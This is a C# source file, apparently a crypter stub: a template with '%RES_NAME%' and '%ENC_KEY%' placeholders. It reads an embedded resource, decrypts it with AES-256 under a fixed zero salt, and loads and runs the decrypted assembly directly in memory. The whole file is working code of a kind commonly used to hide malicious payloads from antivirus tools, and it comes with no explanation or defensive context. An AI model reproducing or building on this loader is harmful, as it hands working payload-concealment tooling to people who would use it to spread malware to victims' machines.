using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace Stub
{
    static class cMain
    {
        private static byte[] bSalt = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
        public static byte[] Decrypt(byte[] bData, byte[] bKey)
        {
            byte[] bDecrypted = null;

            using (MemoryStream mStream = new MemoryStream())
            {
                using (RijndaelManaged rmAES = new RijndaelManaged())
                {
                    rmAES.KeySize = 256;
                    rmAES.BlockSize = 128;

                    Rfc2898DeriveBytes rfcKey = new Rfc2898DeriveBytes(bKey, bSalt, 1000);

                    rmAES.Key = rfcKey.GetBytes(rmAES.KeySize / 8);
                    rmAES.IV = rfcKey.GetBytes(rmAES.BlockSize / 8);

                    rmAES.Mode = CipherMode.CBC;

                    using (CryptoStream cStream = new CryptoStream(mStream, rmAES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cStream.Write(bData, 0, bData.Length);
                        cStream.Close();
                    }

                    bDecrypted = mStream.ToArray();
                }
            }

            return bDecrypted;
        }

        [STAThread]
        static void Main()
        {
            Assembly aASM = Assembly.GetExecutingAssembly();

            using (Stream sResStream = aASM.GetManifestResourceStream("%RES_NAME%"))
            {
                if (sResStream == null)
                    return;

                byte[] bFile = new byte[sResStream.Length];
                sResStream.Read(bFile, 0, bFile.Length);

                bFile = Decrypt(bFile, System.Text.Encoding.Default.GetBytes("%ENC_KEY%"));

                Assembly.Load(bFile).EntryPoint.Invoke(null, null);

            }
        }
    }
}
